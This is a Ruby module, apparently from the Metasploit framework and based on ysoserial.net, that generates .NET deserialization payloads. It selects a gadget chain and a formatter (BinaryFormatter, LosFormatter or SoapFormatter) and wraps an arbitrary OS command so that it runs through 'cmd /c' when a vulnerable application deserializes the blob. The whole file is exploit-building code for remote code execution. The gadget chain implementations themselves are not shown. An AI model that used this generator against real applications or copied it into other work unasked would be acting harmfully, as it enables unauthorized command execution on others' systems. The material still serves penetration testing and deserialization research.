require 'bindata'

module Msf
module Util

#
# Much of this code is based on the YSoSerial.Net project
# see: https://github.com/pwntester/ysoserial.net
#
module DotNetDeserialization
  DEFAULT_FORMATTER = :BinaryFormatter
  DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties

  def self.encode_7bit_int(int)
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
    encoded_int = []
    while int > 0
      value = int & 0x7f
      int >>= 7
      value |= 0x80 if int > 0
      encoded_int << value
    end

    encoded_int.pack('C*')
  end

  def self.get_ancestor(obj, ancestor_type, required: true)
    while ! (obj.nil? || obj.is_a?(ancestor_type))
      obj = obj.parent
    end

    raise RuntimeError, "Failed to find ancestor #{ancestor_type.name}" if obj.nil? && required

    obj
  end

  #
  # Generation Methods
  #

  # Generates a .NET deserialization payload for the specified OS command using
  # a selected gadget-chain and formatter combination.
  #
  # @param cmd [String] The OS command to execute.
  # @param gadget_chain [Symbol] The gadget chain to use for execution. This
  #   will be application specific.
  # @param formatter [Symbol] An optional formatter to use to encapsulate the
  #   gadget chain.
  # @return [String]
  def self.generate(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)
    stream = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
    self.generate_formatted(stream, formatter: formatter)
  end

  # Take the specified serialized blob and encapsulate it with the specified
  # formatter.
  #
  # @param stream [Msf::Util::DotNetDeserialization::Types::SerializedStream]
  #   The serialized stream representing the gadget chain to format into a
  #   string.
  # @param formatter [Symbol] The formatter to use to encapsulate the serialized
  #   data blob.
  # @return [String]
  def self.generate_formatted(stream, formatter: DEFAULT_FORMATTER)
    case formatter
    when :BinaryFormatter
      formatted = Formatters::BinaryFormatter.generate(stream)
    when :LosFormatter
      formatted = Formatters::LosFormatter.generate(stream)
    when :SoapFormatter
      formatted = Formatters::SoapFormatter.generate(stream)
    else
      raise NotImplementedError, 'The specified formatter is not implemented'
    end

    formatted
  end

  # Generate a serialized data blob using the specified gadget chain to execute
  # the OS command. The chosen gadget chain must be compatible with the target
  # application.
  #
  # @param cmd [String] The operating system command to execute. It will
  #   automatically be prefixed with "cmd /c" by the gadget chain.
  # @param gadget_chain [Symbol] The gadget chain to use for execution.
  # @return [Types::SerializedStream]
  def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
    case gadget_chain
    when :TextFormattingRunProperties
      stream = GadgetChains::TextFormattingRunProperties.generate(cmd)
    when :TypeConfuseDelegate
      stream = GadgetChains::TypeConfuseDelegate.generate(cmd)
    when :WindowsIdentity
      stream = GadgetChains::WindowsIdentity.generate(cmd)
    else
      raise NotImplementedError, 'The specified gadget chain is not implemented'
    end

    stream
  end
end
end
end
